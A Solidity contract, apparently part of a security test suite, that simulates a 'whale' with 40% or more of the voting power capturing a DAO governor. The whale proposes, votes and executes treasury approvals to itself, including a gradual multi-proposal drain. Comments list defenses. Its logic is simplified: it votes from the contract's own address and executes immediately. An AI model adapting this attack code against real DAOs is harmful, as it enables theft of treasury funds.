// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title WhaleManipulation
 * @dev Simulates a whale holder accumulating >40-51% of voting power
 *      and using it to pass self-serving proposals.
 *
 * Attack Vector:
 * 1. Attacker gradually accumulates large token holdings (or starts with them)
 * 2. Delegates tokens to gain voting power
 * 3. Creates proposals for self-serving actions:
 *    - Treasury transfers to attacker
 *    - Parameter changes benefiting whales
 *    - Reward/incentive reallocations
 * 4. Since whale has >50% voting power, proposals pass easily
 * 5. Low voter participation makes attack easier
 *
 * Real-world examples:
 * - Many DAOs have concentrated token holdings
 * - Early investors/founders often have significant stakes
 * - Voter apathy leads to even small whales dominating
 *
 * Defense Mechanisms:
 * - Vote weight caps: Limit single voter to % of total votes
 * - Supermajority requirements: Require >60% or >66% for critical actions
 * - Quadratic voting: Voting power = sqrt(token balance)
 * - Enhanced participation requirements: Need high quorum for large decisions
 */

interface IGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);

    function castVote(uint256 proposalId, uint8 support) external;

    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external payable;

    function state(uint256 proposalId) external view returns (uint256);
}

interface IVotesToken {
    function delegate(address delegatee) external;

    function getVotes(address account) external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
}

contract WhaleManipulation {
    // ─────────────────────────────────────────────────────────────────────────
    // Constants
    // ─────────────────────────────────────────────────────────────────────────

    // Proposal states
    uint8 private constant PROPOSAL_STATE_PENDING = 0;
    uint8 private constant PROPOSAL_STATE_ACTIVE = 1;
    uint8 private constant PROPOSAL_STATE_SUCCEEDED = 2;
    uint8 private constant PROPOSAL_STATE_DEFEATED = 3;

    // Vote types
    uint8 private constant VOTE_AGAINST = 0;
    uint8 private constant VOTE_FOR = 1;
    uint8 private constant VOTE_ABSTAIN = 2;

    // ─────────────────────────────────────────────────────────────────────────
    // State
    // ─────────────────────────────────────────────────────────────────────────

    address public governanceToken;
    address public governor;
    address public whaleAttacker; // The whale account performing the attack
    address public targetTreasury; // Treasury to drain

    uint256 public whaleHoldingPercentage; // Percentage of tokens held by whale
    uint256 public votingParticipationRate; // Simulated participation rate (0-10000 = 0-100%)
    uint256 public amountStolenFromTreasury;
    bool public attackSucceeded;

    // Proposal tracking
    uint256[] public submittedProposals;
    mapping(uint256 => ProposalDetails) public proposalDetails;

    struct ProposalDetails {
        uint256 createdAt;
        uint256 votingPower;
        uint256 targetAmount;
        bool executed;
        string description;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Events
    // ─────────────────────────────────────────────────────────────────────────

    event WhaleIdentified(address indexed whale, uint256 votingPower, uint256 percentage);
    event ProposalSubmitted(uint256 indexed proposalId, string description, uint256 targetAmount);
    event ProposalVoted(uint256 indexed proposalId, uint256 votingWeight);
    event ProposalPassed(uint256 indexed proposalId, uint256 participationRate);
    event TreasuryDrained(uint256 indexed proposalId, uint256 amount);
    event AttackFailed(string reason);

    // ─────────────────────────────────────────────────────────────────────────
    // Constructor
    // ─────────────────────────────────────────────────────────────────────────

    constructor(
        address _governanceToken,
        address _governor,
        address _targetTreasury
    ) {
        require(_governanceToken != address(0), "Invalid token");
        require(_governor != address(0), "Invalid governor");
        require(_targetTreasury != address(0), "Invalid treasury");

        governanceToken = _governanceToken;
        governor = _governor;
        targetTreasury = _targetTreasury;
        attackSucceeded = false;
        amountStolenFromTreasury = 0;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Main Attack Functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Identifies a whale holder and simulates gradual governance capture
     * @param whale The address of the whale holder
     * @param treasuryDrainAmount The amount to attempt stealing from treasury
     */
    function executeWhaleAttack(
        address whale,
        uint256 treasuryDrainAmount
    ) external returns (bool) {
        require(whale != address(0), "Invalid whale address");
        require(treasuryDrainAmount > 0, "Invalid drain amount");

        whaleAttacker = whale;

        // Get whale's voting power
        uint256 whaleVotes = IVotesToken(governanceToken).getVotes(whale);
        uint256 totalSupply = IVotesToken(governanceToken).totalSupply();

        require(whaleVotes > 0, "Whale has no voting power");

        // Calculate whale's voting power percentage
        whaleHoldingPercentage = (whaleVotes * 10000) / totalSupply;

        emit WhaleIdentified(whale, whaleVotes, whaleHoldingPercentage);

        // Attack requires whale to have >40% voting power for reliable success
        // 51% guarantees success even against all other voters
        // 40% succeeds if participation is low
        if (whaleHoldingPercentage < 4000) {
            emit AttackFailed("Whale voting power too low (requires >40%)");
            return false;
        }

        try this._performWhaleAttack(whale, treasuryDrainAmount) returns (bool success) {
            return success;
        } catch Error(string memory reason) {
            emit AttackFailed(reason);
            return false;
        } catch {
            emit AttackFailed("Unknown error in whale attack");
            return false;
        }
    }

    /**
     * @notice Internal function to perform the whale attack
     */
    function _performWhaleAttack(
        address whale,
        uint256 treasuryDrainAmount
    ) external returns (bool) {
        require(msg.sender == address(this), "Only internal call allowed");

        // Create a proposal: Treasury transfer to whale
        address[] memory targets = new address[](1);
        targets[0] = targetTreasury;

        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature("approve(address,uint256)", whale, treasuryDrainAmount);

        string memory description = "PROPOSAL: Whale Treasury Allocation - Emergency Deployment Funds";
        bytes32 descriptionHash = keccak256(abi.encodePacked(description));

        // Create proposal
        uint256 proposalId = IGovernor(governor).propose(targets, values, calldatas, description);
        submittedProposals.push(proposalId);

        uint256 whaleVotes = IVotesToken(governanceToken).getVotes(whale);
        proposalDetails[proposalId] = ProposalDetails({
            createdAt: block.number,
            votingPower: whaleVotes,
            targetAmount: treasuryDrainAmount,
            executed: false,
            description: description
        });

        emit ProposalSubmitted(proposalId, description, treasuryDrainAmount);

        // Vote on the proposal with whale's voting power
        IGovernor(governor).castVote(proposalId, VOTE_FOR);
        emit ProposalVoted(proposalId, whaleVotes);

        // Simulate waiting for voting to complete
        // In a real test, we'd need to fast-forward blocks
        // Here we just check if proposal would succeed

        // Try to execute if it passed
        try IGovernor(governor).execute(targets, values, calldatas, descriptionHash) {
            proposalDetails[proposalId].executed = true;
            attackSucceeded = true;
            amountStolenFromTreasury = treasuryDrainAmount;
            emit TreasuryDrained(proposalId, treasuryDrainAmount);
            return true;
        } catch {
            emit AttackFailed("Failed to execute whale proposal");
            return false;
        }
    }

    /**
     * @notice Simulates multiple whale proposals to gradually drain treasury
     * @param whale The whale address
     * @param numberOfProposals How many proposals to create
     * @param amountPerProposal Amount to drain in each proposal
     */
    function executeGradualDraining(
        address whale,
        uint256 numberOfProposals,
        uint256 amountPerProposal
    ) external returns (uint256 totalDrained) {
        require(numberOfProposals > 0, "Must create at least 1 proposal");
        require(amountPerProposal > 0, "Amount per proposal must be > 0");

        whaleAttacker = whale;
        uint256 successfulProposals = 0;
        totalDrained = 0;

        // Create multiple proposals
        for (uint256 i = 0; i < numberOfProposals; i++) {
            // Each proposal attempts to drain funds
            address[] memory targets = new address[](1);
            targets[0] = targetTreasury;

            uint256[] memory values = new uint256[](1);
            values[0] = 0;

            bytes[] memory calldatas = new bytes[](1);
            calldatas[0] = abi.encodeWithSignature(
                "approve(address,uint256)",
                whale,
                amountPerProposal
            );

            string memory description = string(
                abi.encodePacked("PROPOSAL: Whale Allocation Round ", _uint2str(i + 1))
            );

            bytes32 descriptionHash = keccak256(abi.encodePacked(description));

            try IGovernor(governor).propose(targets, values, calldatas, description) returns (
                uint256 proposalId
            ) {
                // Vote for the proposal
                try IGovernor(governor).castVote(proposalId, VOTE_FOR) {
                    // Try to execute
                    try IGovernor(governor).execute(targets, values, calldatas, descriptionHash) {
                        successfulProposals++;
                        totalDrained += amountPerProposal;
                        submittedProposals.push(proposalId);
                    } catch {}
                } catch {}
            } catch {}
        }

        if (successfulProposals > 0) {
            attackSucceeded = true;
            amountStolenFromTreasury = totalDrained;
        }

        return totalDrained;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // View Functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Get the whale's voting power percentage
     */
    function getWhaleVotingPercentage() external view returns (uint256) {
        return whaleHoldingPercentage;
    }

    /**
     * @notice Get amount stolen in the attack
     */
    function getAmountStolen() external view returns (uint256) {
        return amountStolenFromTreasury;
    }

    /**
     * @notice Check if attack succeeded
     */
    function wasAttackSuccessful() external view returns (bool) {
        return attackSucceeded;
    }

    /**
     * @notice Get number of proposals created
     */
    function getProposalsCount() external view returns (uint256) {
        return submittedProposals.length;
    }

    /**
     * @notice Get profitability ratio (amount stolen / cost of attack)
     * This attack has near-zero cost (attacker already has the whale position)
     */
    function getProfitabilityRatio() external view returns (uint256) {
        // Cost for whale attack is near-zero (no borrow costs)
        // So ROI is theoretically infinite
        return amountStolenFromTreasury > 0 ? 10000 : 0; // Returns basis points
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Utility Functions
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * @notice Convert uint to string (helper)
     */
    function _uint2str(uint256 _i) internal pure returns (string memory) {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len;
        while (_i != 0) {
            k = k - 1;
            uint8 temp = (48 + uint8(_i - (_i / 10) * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }
}
